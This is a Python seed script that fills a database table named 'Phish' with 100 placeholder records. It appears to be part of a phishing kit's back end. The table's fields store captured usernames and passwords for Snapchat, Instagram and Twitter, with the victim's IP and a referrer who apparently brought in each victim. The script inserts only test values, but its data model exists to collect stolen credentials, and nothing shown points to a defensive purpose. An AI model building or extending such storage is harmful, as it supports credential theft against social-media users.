from app import db
import random
from app.main.config.models import User, Phish
for i in range(0,100):
    new = Phish(refferer=random.choice(['nemo','xo']),
                platform=random.choice(['Snapchat', 'Instagram','Twitter']),
                phised_user=f'test_user{i}',
                phished_pword=f'test_pword{i}',
                ip='127.0.0.1')
    db.session.add(new)
    db.session.commit()
'''
class Phish(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    refferer = db.Column(db.String)
    platform = db.Column(db.String)
    phised_user = db.Column(db.String)
    phished_pword = db.Column(db.String)
    ip = db.Column(db.String)
    
'''